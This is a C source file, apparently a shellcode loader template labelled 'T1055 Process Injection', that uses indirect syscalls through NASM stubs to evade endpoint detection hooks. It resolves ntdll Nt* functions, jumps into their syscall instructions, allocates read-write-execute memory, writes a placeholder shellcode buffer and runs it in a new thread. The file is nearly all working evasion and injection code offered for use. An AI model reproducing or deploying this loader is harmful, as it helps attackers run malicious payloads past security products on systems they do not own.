/**
Editor: Thomas X Meng
T1055 Process Injection
Indirect syscall
Classic indirect syscall

_NtAllocateVirtualMemory_stub:
    mov r10, rcx
    mov eax, 0x18
    jmp qword [rel sysAddrNtAllocateVirtualMemory]

TODO: add halo's gate support for finding syscall SSN
**/


#include <windows.h>  // Include the Windows API header
#include <stdio.h>
#include <winternl.h>

// The type NTSTATUS is typically defined in the Windows headers as a long.
typedef long NTSTATUS;  // Define NTSTATUS as a long
typedef NTSTATUS* PNTSTATUS;  // Define a pointer to NTSTATUS

// --- Function pointer typedefs for NT syscalls ---
typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID lpStartAddress,
    PVOID lpParameter,
    ULONG Flags,
    SIZE_T StackZeroBits,
    SIZE_T SizeOfStackCommit,
    SIZE_T SizeOfStackReserve,
    PVOID lpBytesBuffer
);

typedef NTSTATUS (NTAPI *NtWaitForSingleObject_t)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);

// --- These will point to the syscall trampoline addresses ---
UINT_PTR sysAddrNtAllocateVirtualMemory;
UINT_PTR sysAddrNtWriteVirtualMemory;
UINT_PTR sysAddrNtCreateThreadEx;
UINT_PTR sysAddrNtWaitForSingleObject;

// --- These are used to extract the syscall trampoline addresses ---
NtAllocateVirtualMemory_t NtAllocateVirtualMemory;
NtWriteVirtualMemory_t NtWriteVirtualMemory;
NtCreateThreadEx_t NtCreateThreadEx;
NtWaitForSingleObject_t pNtWaitForSingleObject;

// --- Externs from NASM file: indirect_syscall.asm ---
#ifdef __cplusplus
extern "C" {
#endif

extern void _NtAllocateVirtualMemory_stub(void);
extern void _NtWriteVirtualMemory_stub(void);
extern void _NtCreateThreadEx_stub(void);
extern void _NtWaitForSingleObject_stub(void);

#ifdef __cplusplus
}
#endif

unsigned char magiccode[] = ####SHELLCODE####;



int main(int argc, char *argv[]) {


    PVOID allocBuffer = NULL;  // Declare a pointer to the buffer to be allocated
    SIZE_T buffSize = sizeof(magiccode);  // Declare the size of the buffer (4096 bytes)


    // Get a handle to the ntdll.dll library
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        // Handle the error, for example, print an error message and return.
        printf("Error: the specified module could not be found.");
        return 1; // Or any other non-zero value, since typically a zero return indicates success
    }     


    // Dynamically resolve NT functions
    NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(hNtdll, "NtCreateThreadEx");
    pNtWaitForSingleObject = (NtWaitForSingleObject_t)GetProcAddress(hNtdll, "NtWaitForSingleObject");

    if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtCreateThreadEx || !pNtWaitForSingleObject) {
        printf("[-] Error: Failed to resolve one or more Nt* functions.\n");
        return 1;
    }

    // Calculate syscall trampoline addresses
    sysAddrNtAllocateVirtualMemory = (UINT_PTR)NtAllocateVirtualMemory + 0x12;
    sysAddrNtWriteVirtualMemory = (UINT_PTR)NtWriteVirtualMemory + 0x12;
    sysAddrNtCreateThreadEx = (UINT_PTR)NtCreateThreadEx + 0x12;
    sysAddrNtWaitForSingleObject = (UINT_PTR)pNtWaitForSingleObject + 0x12;

    // Call NASM syscall stubs
    NTSTATUS status = ((NtAllocateVirtualMemory_t)_NtAllocateVirtualMemory_stub)(
        (HANDLE)-1,
        (PVOID*)&allocBuffer,
        0,
        &buffSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (status != 0) {
        printf("[-] NtAllocateVirtualMemory failed with NTSTATUS: 0x%lx\n", status);
        return 1;
    }
    printf("[+] Memory allocated at: %p\n", allocBuffer);

    // -------------------------------------------------------

    ULONG bytesWritten = 0;
    printf("[+] Writing magiccode via NtWriteVirtualMemory...\n");

    status = ((NtWriteVirtualMemory_t)_NtWriteVirtualMemory_stub)(
        GetCurrentProcess(),
        allocBuffer,
        magiccode,
        sizeof(magiccode),
        &bytesWritten
    );

    if (status != 0 || bytesWritten != sizeof(magiccode)) {
        printf("[-] NtWriteVirtualMemory failed. NTSTATUS: 0x%lx, Bytes Written: %lu\n", status, bytesWritten);
        return 1;
    }
    printf("[+] Wrote %lu bytes to allocated memory\n", bytesWritten);

    // -------------------------------------------------------

    HANDLE hThread = NULL;
    printf("[+] Creating remote thread via NtCreateThreadEx...\n");

    status = ((NtCreateThreadEx_t)_NtCreateThreadEx_stub)(
        &hThread,
        GENERIC_EXECUTE,
        NULL,
        GetCurrentProcess(),
        (PVOID)(uintptr_t)allocBuffer,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );

    if (status != 0 || hThread == NULL) {
        printf("[-] NtCreateThreadEx failed with NTSTATUS: 0x%lx\n", status);
        return 1;
    }
    printf("[+] Thread created successfully. Handle: %p\n", hThread);

    // -------------------------------------------------------

    printf("[+] Waiting for thread to complete via NtWaitForSingleObject...\n");

    status = ((NtWaitForSingleObject_t)_NtWaitForSingleObject_stub)(
        hThread,
        FALSE,
        NULL
    );

    if (status != 0) {
        printf("[-] NtWaitForSingleObject failed with NTSTATUS: 0x%lx\n", status);
        return 1;
    }
    printf("[+] Thread has finished execution.\n");
    return 0;

}

